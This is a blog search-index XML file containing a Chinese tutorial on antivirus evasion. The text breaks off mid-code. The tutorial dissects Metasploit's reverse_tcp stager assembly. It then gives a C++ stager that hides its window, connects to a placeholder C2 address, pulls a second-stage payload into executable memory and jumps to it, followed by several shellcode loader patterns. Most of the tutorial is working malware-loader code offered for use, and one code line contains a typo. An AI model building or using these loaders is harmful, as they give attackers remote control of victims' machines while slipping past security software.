<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>免杀基础</title>
    <link href="/2024/05/20/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80/"/>
    <url>/2024/05/20/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h3><h4 id="1、shellcode是什么"><a href="#1、shellcode是什么" class="headerlink" title="1、shellcode是什么"></a>1、shellcode是什么</h4><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode<strong>机器码</strong>，让电脑可以执行攻击者的任意指令。</p><p>说白了，就是一段16进制字符串，可以直接运行在内存中</p><h4 id="2、shellcode分类"><a href="#2、shellcode分类" class="headerlink" title="2、shellcode分类"></a>2、shellcode分类</h4><h6 id="stage和stageless"><a href="#stage和stageless" class="headerlink" title="stage和stageless"></a>stage和stageless</h6><p>Stage&amp;Stageless. 所谓的<strong>stage</strong>(有阶段)，指的是Beacon会分段的加载shellcode(具体表现为，通过不断的向Listener发起请求，最终获取一个完整的shellcode并执行)，<strong>stageless</strong>(无阶段)，则是在生成时包含完整的shellcode。</p><p>说白了，webshell里的小马和大马</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp stage<br>windows<span class="hljs-regexp">/x64/m</span>eterpreter_reverse_tcp stageless<br></code></pre></td></tr></table></figure><h4 id="3、stage-有阶段-shellcode分析"><a href="#3、stage-有阶段-shellcode分析" class="headerlink" title="3、stage(有阶段)shellcode分析"></a>3、<strong>stage</strong>(有阶段)shellcode分析</h4><p>msf的shellcode源码：</p><p><a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/stager/stager_reverse_tcp_nx.asm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/stager/stager_reverse_tcp_nx.asm</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">[BITS 32]<br>[ORG 0]<br><br>  cld                    ; Clear the direction flag. 用于将处理器的方向标志位清零，确保字符串操作的方向是向上增长。<br>  call start             ; Call start, this pushes the address of &#x27;api_call&#x27; onto the stack. 这是一个函数调用，它调用了一个名为start的标签处的代码。<br>%include &quot;./src/block/block_api.asm&quot; 这条指令包含了一个外部文件的内容，这个文件包含了API调用相关的代码。<br>start:                   ;<br>  pop ebp                ; pop off the address of &#x27;api_call&#x27; for calling later. 这里使用pop指令将栈顶的数值弹出并存入寄存器ebp中。<br>%include &quot;./src/block/block_reverse_tcp.asm&quot; <br>  ; By here we will have performed the reverse_tcp connection and EDI will be our socket. 这个指令又包含了另一个外部文件的内容，可能是与反向TCP shell相关的代码。<br>%include &quot;./src/block/block_recv.asm&quot;<br>  ; By now we will have recieved in the second stage into a RWX buffer and be executing it. 这个指令包含了接收数据的代码。<br></code></pre></td></tr></table></figure><h6 id="block-api-asm"><a href="#block-api-asm" class="headerlink" title="block_api.asm"></a>block_api.asm</h6><p>代码中包含了三个文件，先来分析第一个 .&#x2F;src&#x2F;block&#x2F;block_api.asm 文件</p><p><a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs assembly">api_call:<br>  pushad                     ; We preserve all the registers for the caller, bar EAX and ECX.<br>  mov ebp, esp               ; Create a new stack frame<br>  xor edx, edx               ; Zero EDX<br>  mov edx, [fs:edx+0x30]     ; Get a pointer to the PEB<br>  mov edx, [edx+0xc]         ; Get PEB-&gt;Ldr<br>  mov edx, [edx+0x14]        ; Get the first module from the InMemoryOrder module list<br>next_mod:                    ;<br>  mov esi, [edx+0x28]        ; Get pointer to modules name (unicode string)<br>  movzx ecx, word [edx+0x26] ; Set ECX to the length we want to check<br>  xor edi, edi               ; Clear EDI which will store the hash of the module name<br>loop_modname:                ;<br>  xor eax, eax               ; Clear EAX<br>  lodsb                      ; Read in the next byte of the name<br>  cmp al, &#x27;a&#x27;                ; Some versions of Windows use lower case module names<br>  jl not_lowercase           ;<br>  sub al, 0x20               ; If so normalise to uppercase<br>not_lowercase:               ;<br>  ror edi, 0xd               ; Rotate right our hash value<br>  add edi, eax               ; Add the next byte of the name<br>  dec ecx<br>  jnz loop_modname           ; Loop until we have read enough<br>  ; We now have the module hash computed<br>  push edx                   ; Save the current position in the module list for later<br>  push edi                   ; Save the current module hash for later<br>  ; Proceed to iterate the export address table,<br>  mov edx, [edx+0x10]        ; Get this modules base address<br>  mov eax, [edx+0x3c]        ; Get PE header<br>  add eax, edx               ; Add the modules base address<br>  mov eax, [eax+0x78]        ; Get export tables RVA<br>  test eax, eax              ; Test if no export address table is present<br>  jz get_next_mod1           ; If no EAT present, process the next module<br>  add eax, edx               ; Add the modules base address<br>  push eax                   ; Save the current modules EAT<br>  mov ecx, [eax+0x18]        ; Get the number of function names<br>  mov ebx, [eax+0x20]        ; Get the rva of the function names<br>  add ebx, edx               ; Add the modules base address<br>  ; Computing the module hash + function hash<br>get_next_func:               ;<br>  test ecx, ecx              ; Changed from jecxz to accomodate the larger offset produced by random jmps below<br>  jz get_next_mod            ; When we reach the start of the EAT (we search backwards), process the next module<br>  dec ecx                    ; Decrement the function name counter<br>  mov esi, [ebx+ecx*4]       ; Get rva of next module name<br>  add esi, edx               ; Add the modules base address<br>  xor edi, edi               ; Clear EDI which will store the hash of the function name<br>  ; And compare it to the one we want<br>loop_funcname:               ;<br>  xor eax, eax               ; Clear EAX<br>  lodsb                      ; Read in the next byte of the ASCII function name<br>  ror edi, 0xd               ; Rotate right our hash value<br>  add edi, eax               ; Add the next byte of the name<br>  cmp al, ah                 ; Compare AL (the next byte from the name) to AH (null)<br>  jne loop_funcname          ; If we have not reached the null terminator, continue<br>  add edi, [ebp-8]           ; Add the current module hash to the function hash<br>  cmp edi, [ebp+0x24]        ; Compare the hash to the one we are searchnig for<br>  jnz get_next_func          ; Go compute the next function hash if we have not found it<br>  ; If found, fix up stack, call the function and then value else compute the next one...<br>  pop eax                    ; Restore the current modules EAT<br>  mov ebx, [eax+0x24]        ; Get the ordinal table rva<br>  add ebx, edx               ; Add the modules base address<br>  mov cx, [ebx+2*ecx]        ; Get the desired functions ordinal<br>  mov ebx, [eax+0x1c]        ; Get the function addresses table rva<br>  add ebx, edx               ; Add the modules base address<br>  mov eax, [ebx+4*ecx]       ; Get the desired functions RVA<br>  add eax, edx               ; Add the modules base address to get the functions actual VA<br>  ; We now fix up the stack and perform the call to the desired function...<br>finish:<br>  mov [esp+0x24], eax        ; Overwrite the old EAX value with the desired api address for the upcoming popad<br>  pop ebx                    ; Clear off the current modules hash<br>  pop ebx                    ; Clear off the current position in the module list<br>  popad                      ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered<br>  pop ecx                    ; Pop off the origional return address our caller will have pushed<br>  pop edx                    ; Pop off the hash value our caller will have pushed<br>  push ecx                   ; Push back the correct return value<br>  jmp eax                    ; Jump into the required function<br>  ; We now automagically return to the correct caller...<br>get_next_mod:                ;<br>  pop eax                    ; Pop off the current (now the previous) modules EAT<br>get_next_mod1:               ;<br>  pop edi                    ; Pop off the current (now the previous) modules hash<br>  pop edx                    ; Restore our position in the module list<br>  mov edx, [edx]             ; Get the next module<br>  jmp next_mod               ; Process this module<br></code></pre></td></tr></table></figure><p>主要功能是通过计算的hash值来找到对应 dll 和函数的地址，大概流程如下：</p><ol><li>程序首先通过哈希值比较的方式，在已加载的模块列表中搜索匹配的函数名。它使用一个循环来遍历模块列表，并将函数名与哈希值进行比较，直到找到匹配的函数或遍历完所有模块。</li><li>如果找到了匹配的函数，程序会恢复栈上的数据，并获取目标函数的地址。</li><li>接下来，程序会修正栈上的数据，以便调用目标函数，并跳转到该函数的地址，实现函数调用。</li><li>如果没有找到匹配的函数，或者已经遍历完所有模块，则程序会继续处理下一个模块，直到找到匹配的函数或遍历完所有模块为止。</li></ol><h6 id="block-reverse-tcp-asm"><a href="#block-reverse-tcp-asm" class="headerlink" title="block_reverse_tcp.asm"></a>block_reverse_tcp.asm</h6><p>第二个文件是 .&#x2F;src&#x2F;block&#x2F;block_reverse_tcp.asm 文件</p><p><a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs assembly">reverse_tcp:<br>  push 0x00003233        ; Push the bytes &#x27;ws2_32&#x27;,0,0 onto the stack.<br>  push 0x5F327377        ; ...<br>  push esp               ; Push a pointer to the &quot;ws2_32&quot; string on the stack.<br>  push 0x0726774C        ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )<br>  call ebp               ; LoadLibraryA( &quot;ws2_32&quot; )<br>  <br>  mov eax, 0x0190        ; EAX = sizeof( struct WSAData )<br>  sub esp, eax           ; alloc some space for the WSAData structure<br>  push esp               ; push a pointer to this stuct<br>  push eax               ; push the wVersionRequested parameter<br>  push 0x006B8029        ; hash( &quot;ws2_32.dll&quot;, &quot;WSAStartup&quot; )<br>  call ebp               ; WSAStartup( 0x0190, &amp;WSAData );<br>  <br>  push eax               ; if we succeed, eax wil be zero, push zero for the flags param.<br>  push eax               ; push null for reserved parameter<br>  push eax               ; we do not specify a WSAPROTOCOL_INFO structure<br>  push eax               ; we do not specify a protocol<br>  inc eax                ;<br>  push eax               ; push SOCK_STREAM<br>  inc eax                ;<br>  push eax               ; push AF_INET<br>  push 0xE0DF0FEA        ; hash( &quot;ws2_32.dll&quot;, &quot;WSASocketA&quot; )<br>  call ebp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );<br>  xchg edi, eax          ; save the socket for later, don&#x27;t care about the value of eax after this<br><br>set_address:<br>  push byte 0x05         ; retry counter<br>  push 0x0100007F        ; host 127.0.0.1<br>  push 0x5C110002        ; family AF_INET and port 4444<br>  mov esi, esp           ; save pointer to sockaddr struct<br>  <br>try_connect:<br>  push byte 16           ; length of the sockaddr struct<br>  push esi               ; pointer to the sockaddr struct<br>  push edi               ; the socket<br>  push 0x6174A599        ; hash( &quot;ws2_32.dll&quot;, &quot;connect&quot; )<br>  call ebp               ; connect( s, &amp;sockaddr, 16 );<br><br>  test eax,eax           ; non-zero means a failure<br>  jz short connected<br><br>handle_failure:<br>  dec dword [esi+8]<br>  jnz short try_connect<br><br>failure:<br>  push 0x56A2B5F0        ; hardcoded to exitprocess for size<br>  call ebp<br><br>connected:<br></code></pre></td></tr></table></figure><p>这个文件是发起socket连接的，请求连接写好的c2的地址和端口，大概流程是</p><ol><li>加载 ws2_32.dll 库；</li><li>调用 WSAStartup() 初始化 Winsock；</li><li>调用 WSASocketA() 创建一个套接字；</li><li>指定要连接的目标地址和端口号；</li><li>调用 connect() 尝试连接指定的目标；</li><li>如果连接失败，则重试指定次数（这里是 5 次）；</li><li>如果连接成功，则将控制权交给远程主机。</li></ol><h6 id="block-recv-asm"><a href="#block-recv-asm" class="headerlink" title="block_recv.asm"></a>block_recv.asm</h6><p>第三个文件是 .&#x2F;src&#x2F;block&#x2F;block_recv.asm 文件</p><p><a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_recv.sm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_recv.sm</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs assembly">[BITS 32]<br><br>; Compatible: block_bind_tcp, block_reverse_tcp, block_reverse_ipv6_tcp<br><br>; Input: EBP must be the address of &#x27;api_call&#x27;. EDI must be the socket. ESI is a pointer on stack.<br>; Output: None.<br>; Clobbers: EAX, EBX, ESI, (ESP will also be modified)<br><br>recv:<br>  ; Receive the size of the incoming second stage...<br>  push byte 0            ; flags<br>  push byte 4            ; length = sizeof( DWORD );<br>  push esi               ; the 4 byte buffer on the stack to hold the second stage length<br>  push edi               ; the saved socket<br>  push 0x5FC8D902        ; hash( &quot;ws2_32.dll&quot;, &quot;recv&quot; )<br>  call ebp               ; recv( s, &amp;dwLength, 4, 0 );<br>  ; Alloc a RWX buffer for the second stage<br>  mov esi, [esi]         ; dereference the pointer to the second stage length<br>  push byte 0x40         ; PAGE_EXECUTE_READWRITE<br>  push 0x1000            ; MEM_COMMIT<br>  push esi               ; push the newly recieved second stage length.<br>  push byte 0            ; NULL as we dont care where the allocation is.<br>  push 0xE553A458        ; hash( &quot;kernel32.dll&quot;, &quot;VirtualAlloc&quot; )<br>  call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );<br>  ; Receive the second stage and execute it...<br>  xchg ebx, eax          ; ebx = our new memory address for the new stage<br>  push ebx               ; push the address of the new stage so we can return into it<br>read_more:               ;<br>  push byte 0            ; flags<br>  push esi               ; length<br>  push ebx               ; the current address into our second stage&#x27;s RWX buffer<br>  push edi               ; the saved socket<br>  push 0x5FC8D902        ; hash( &quot;ws2_32.dll&quot;, &quot;recv&quot; )<br>  call ebp               ; recv( s, buffer, length, 0 );<br>  add ebx, eax           ; buffer += bytes_received<br>  sub esi, eax           ; length -= bytes_received, will set flags<br>  jnz read_more          ; continue if we have more to read<br>  ret                    ; return into the second stage<br></code></pre></td></tr></table></figure><p>这个文件是处理接收到的内容的，运行 recv 接收一个4字节，然后把这个4字节内容作为长度，使用virtualAlloc开辟对应长度的空间，循环读接下来发送过来的内容并存到刚刚开辟的空间里面，最后直接ret 将之前开辟空间的地址放到eip，运行传输过来的内容用于第二阶段的持续控制。 </p><ol><li>接收第二阶段的大小</li><li>为第二阶段分配一个RWX（可读可写可执行）的缓冲区</li><li>接收第二阶段的代码到缓冲区</li><li>最后，使用ret指令从函数中返回，并跳转到第二阶段的地址，开始执行第二阶段的代码。</li></ol><h6 id="c-实现shellcode连接"><a href="#c-实现shellcode连接" class="headerlink" title="c++实现shellcode连接"></a>c++实现shellcode连接</h6><p>接下来使用c++实现上述的功能，替代shellcode，直接利用socket与msf建立连接，实现免杀</p><p>主要步骤：</p><ol><li>找到ws2_32.dll库</li><li>初始化socket对象</li><li>开始建立链接</li><li>申请需要的内存空间</li><li>循环接受msf传递的payload到内存空间中</li><li>使用汇编指令jmp将内存空间中的payload转换成可执行的代码</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;WinSock2.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> <span class="hljs-keyword">warning</span> (disable: 4996)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib,<span class="hljs-string">&quot;WS2_32.lib&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">ShowWindow</span>(<span class="hljs-built_in">GetForegroundWindow</span>(), <span class="hljs-number">0</span>); <span class="hljs-comment">//将当前活动窗口隐藏</span><br><span class="hljs-comment">//分配socket资源</span><br>WSADATA wsdata;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsdata))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;WSAStartp fail.\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//申请socket，并链接</span><br>SOCKET socket = <span class="hljs-built_in">WSASocket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>SOCKADDR_IN server;<br><span class="hljs-built_in">ZeroMemory</span>(&amp;server, <span class="hljs-built_in">sizeof</span>(SOCKADDR_IN));<br>server.sin_family = AF_INET;<br>server.sin_addr.s_addr = <span class="hljs-built_in">inet_addr</span>(<span class="hljs-string">&quot;X.X.X.X&quot;</span>); <span class="hljs-comment">//server ip</span><br>server.sin_port = <span class="hljs-built_in">htons</span>(<span class="hljs-number">4444</span>); <span class="hljs-comment">//server port</span><br><span class="hljs-keyword">if</span> (SOCKET_ERROR == <span class="hljs-built_in">connect</span>(socket, (SOCKADDR*)&amp;server, <span class="hljs-built_in">sizeof</span>(server)))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;connect to server fail.\n&quot;</span>);<br><span class="hljs-keyword">goto</span> Fail;<br>&#125;<br><br><span class="hljs-comment">//接收长度</span><br>u_int stagelength;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">recv</span>(socket, (<span class="hljs-type">char</span>*)&amp;stagelength, <span class="hljs-built_in">sizeof</span>(stagelength), <span class="hljs-number">0</span>) != <span class="hljs-built_in">sizeof</span>(stagelength))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;recv error\n&quot;</span>);<br><span class="hljs-keyword">goto</span> Fail;<br>&#125;<br><br><span class="hljs-comment">//分配空间，以接收真正载荷</span><br><span class="hljs-type">char</span>* orig_buffer;<br>orig_buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, stagel ength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br><span class="hljs-type">char</span>* stage_buf;<br>stage_buf = orig_buffer;<br><span class="hljs-type">int</span> ret;<br>ret = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">do</span><br>&#123;<br>ret = <span class="hljs-built_in">recv</span>(socket, stage_buf, stagelength, <span class="hljs-number">0</span>);<br>stage_buf += ret;<br>stagelength -= ret;<br>&#125; <span class="hljs-keyword">while</span> (ret &gt; <span class="hljs-number">0</span> &amp;&amp; stagelength &gt; <span class="hljs-number">0</span>);<br><br><br><span class="hljs-comment">//传入参数，并执行载荷</span><br>__asm<br>&#123;<br>mov edi, socket;   <span class="hljs-comment">//socket 存放在edi中</span><br>jmp orig_buffer; <span class="hljs-comment">//执行权转移到 载荷中，不要指望它返回。如果想要它返回，修改量比较大，不如把这个地方做成个线程,监听端设置退出时ExitThread更方便</span><br>&#125;<br><br><span class="hljs-comment">//释放空间</span><br><span class="hljs-built_in">VirtualFree</span>(orig_buffer, <span class="hljs-number">0</span>, MEM_RELEASE);<br><br>Fail:<br><br><span class="hljs-built_in">closesocket</span>(socket);<br><span class="hljs-built_in">WSACleanup</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="基础加载器"><a href="#基础加载器" class="headerlink" title="基础加载器"></a>基础加载器</h3><h4 id="1、内联汇编加载"><a href="#1、内联汇编加载" class="headerlink" title="1、内联汇编加载"></a>1、内联汇编加载</h4><p>使用内联汇编只能加载32位程序的ShellCode，因为64位程序不支持写内联汇编</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/section:.data,RWE&quot;</span>) <span class="hljs-comment">//将data段的内存设置成可读可写可执行</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-comment">//ShellCode部分</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <br>__asm &#123;<br>lea eax,buf    <span class="hljs-comment">// lea是赋予地址的操作符 将buf的地址赋值给eax寄存器</span><br>call eax  <span class="hljs-comment">// call是函数调用操作符 调用eax，将eax里的值当作函数来执行</span><br>&#125;<br>&#125;<br><span class="hljs-comment">// 把buf的变量所在的位置当作我们执行的空间，赋予了一个可执行的属性，然后用函数调用的方式去执行</span><br></code></pre></td></tr></table></figure><h4 id="2、使用函数指针加载"><a href="#2、使用函数指针加载" class="headerlink" title="2、使用函数指针加载"></a>2、使用函数指针加载</h4><p>如下代码所示，<code>(void(*)(void))</code>是一个函数指针类型的强制转换, 该函数指针指向一个没有参数且返回值类型为void的函数，也就是说这行代码将 <code>buf</code> 的地址转换为一个函数指针，然后调用该指针所指向的函数，其实这种方法和上述加载方式原理是一样的，只不过这种方法还能用于加载64位的ShellCode</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/section:.data,RWE&quot;</span>) <span class="hljs-comment">//将data段的内存设置成可读可写可执行</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-comment">//ShellCode部分</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] =<span class="hljs-string">&quot;0x??&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;   <br>((<span class="hljs-built_in">void</span>(*)(<span class="hljs-type">void</span>)) &amp; buf)();  <span class="hljs-comment">//执行ShellCode</span><br>&#125;<br><span class="hljs-comment">// void(*)(void) 定义一个函数类型 函数的返回值为空 函数的参数为空 并且是一个指针函数</span><br><span class="hljs-comment">// (void(*)(void) &amp;buf 将&amp;buf强制类型转换成void(*)(void)这个指针函数的类型</span><br><span class="hljs-comment">// ((void(*)(void)) &amp;buf) () 函数调用 调用((void(*)(void)) &amp;buf)一整个函数</span><br></code></pre></td></tr></table></figure><h4 id="3、创建线程加载"><a href="#3、创建线程加载" class="headerlink" title="3、创建线程加载"></a>3、创建线程加载</h4><p>上述两种方法都需要将data节的内存设置成可读可写可执行, 以下这段代码的主要作用是在内存中分配一段可执行的内存空间，将buf数组中的内容复制到该内存空间，并创建一个新线程来执行这段内存中的代码</p><p>主要分为三步：</p><ul><li>1、申请一段新的内存空间</li><li>2、把shellcode复制过去</li><li>3、用新的线程去执行这段新的空间里的内容</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 